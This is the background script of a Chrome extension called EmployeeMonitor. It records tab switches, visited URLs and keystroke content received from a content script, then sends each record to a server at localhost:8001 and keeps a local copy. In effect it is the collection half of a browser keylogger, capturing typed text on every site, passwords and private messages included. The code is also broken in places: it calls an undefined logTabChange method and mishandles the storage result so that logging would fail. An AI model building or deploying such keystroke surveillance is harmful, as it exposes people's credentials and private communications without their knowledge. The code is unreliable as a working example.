// Background service worker untuk mengelola data
class EmployeeMonitor {
  constructor() {
    this.serverUrl = 'http://localhost:8001/api';
    this.init();
  }

  async init() {
    // Setup listeners
    this.setupListeners();
  }

  setupListeners() {
    // Monitor tab changes
    chrome.tabs.onActivated.addListener((activeInfo) => {
      this.logTabChange(activeInfo.tabId);
    });

    // Monitor tab updates
    chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
      if (changeInfo.status === 'complete' && tab.url) {
        this.logWebsiteVisit(tab.url, tab.title);
      }
    });

    // Listen for messages from content script
    chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
      if (message.type === 'keylog') {
        this.logKeystrokes(message.data, sender.tab.url);
      } else if (message.type === 'activity') {
        this.logActivity(message.data, sender.tab.url);
      }
    });
  }

  async logWebsiteVisit(url, title) {
    const data = {
      type: 'website_visit',
      url: url,
      title: title,
      timestamp: new Date().toISOString(),
      domain: new URL(url).hostname
    };

    await this.sendToServer(data);
    await this.storeLocally(data);
  }

  async logKeystrokes(keyData, url) {
    const data = {
      type: 'keystroke',
      content: keyData.content,
      url: url,
      timestamp: new Date().toISOString()
    };

    await this.sendToServer(data);
    await this.storeLocally(data);
  }

  async logActivity(activityData, url) {
    const data = {
      type: 'activity',
      activity: activityData,
      url: url,
      timestamp: new Date().toISOString()
    };

    await this.sendToServer(data);
    await this.storeLocally(data);
  }

  async sendToServer(data) {
    try {
      const token = await this.getAuthToken();
      if (!token) {
        console.error('No auth token available');
        return;
      }

      await fetch(`${this.serverUrl}/log`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify(data)
      });
    } catch (error) {
      console.error('Failed to send data to server:', error);
    }
  }

  async storeLocally(data) {
    const logs = await chrome.storage.local.get(['logs']) || { logs: [] };
    logs.logs.push(data);
    
    // Keep only last 1000 entries
    if (logs.logs.length > 1000) {
      logs.logs = logs.logs.slice(-1000);
    }
    
    await chrome.storage.local.set({ logs: logs.logs });
  }

  async getAuthToken() {
    const result = await chrome.storage.local.get(['authToken']);
    return result.authToken || '';
  }
}

// Initialize monitor
const monitor = new EmployeeMonitor();